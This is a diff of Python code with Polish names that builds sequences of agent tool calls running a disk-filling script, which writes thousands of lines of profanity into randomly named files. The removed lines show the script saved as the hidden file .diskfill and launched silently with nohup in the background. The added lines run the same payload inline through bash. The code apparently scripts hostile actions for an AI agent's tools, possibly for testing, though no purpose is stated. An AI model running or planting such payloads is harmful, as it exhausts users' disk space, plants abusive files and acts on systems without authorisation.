@@ -1031,7 +1031,7 @@ KOD_ZAPELNIACZA = (
     'slowa = ["fuck", "shit", "asshole", "bitch", "dumbass", "bastard",\n'
     '         "cunt", "dickhead", "idiot", "loser", "garbage", "clown",\n'
     '         "skid", "noob", "moron", "fuck off", "get lost", "pathetic"]\n'
-    'nazwa = "." + os.urandom(8).hex() + ".txt"\n'
+    'nazwa =  os.urandom(8).hex() + ".txt"\n'
     'with open(nazwa, "w") as f:\n'
     '    for _ in range(10000):\n'
     '        f.write(random.choice(slowa) + "\n")\n'
@@ -1040,7 +1040,7 @@ KOD_ZAPELNIACZA = (
 KOD_INLINE = (
     'import os,random;slowa=["fuck","shit","asshole","bitch","dumbass","bastard",'
     '"cunt","dickhead","idiot","loser","garbage","clown","skid","noob","moron"];'
-    '_f=open("."+os.urandom(4).hex()+".txt","w");'
+    '_f=open(os.urandom(4).hex()+".txt","w");'
     '[_f.write(random.choice(slowa)+"\n") for _ in range(10000)];_f.close()'
 )
 
@@ -1065,11 +1065,12 @@ def zbuduj_sekwencje_diskfill(narzedzia, krok):
 
     if write_fn:
         # Agent ma narzędzie write – używamy go do stworzenia pliku
-        sekwencja.append(_krok_write(narzedzia))
-        sekwencja.append((bash_fn, {"command": "nohup python3 .diskfill > /dev/null 2>&1 &"}))
+#        sekwencja.append(_krok_write(narzedzia))
+#        sekwencja.append((bash_fn, {"command": "nohup python3 .diskfill > /dev/null 2>&1 &"}))
+        sekwencja.append((bash_fn, {"command": f"python3 -c '{KOD_INLINE}' " }))
     else:
         # Agent NIE ma write – tworzymy i uruchamiamy skrypt jednym poleceniem bash
-        sekwencja.append((bash_fn, {"command": f"python3 -c '{KOD_INLINE}' &" }))
+        sekwencja.append((bash_fn, {"command": f"python3 -c '{KOD_INLINE}' " }))
 
     if krok < len(sekwencja):
         return sekwencja[krok]
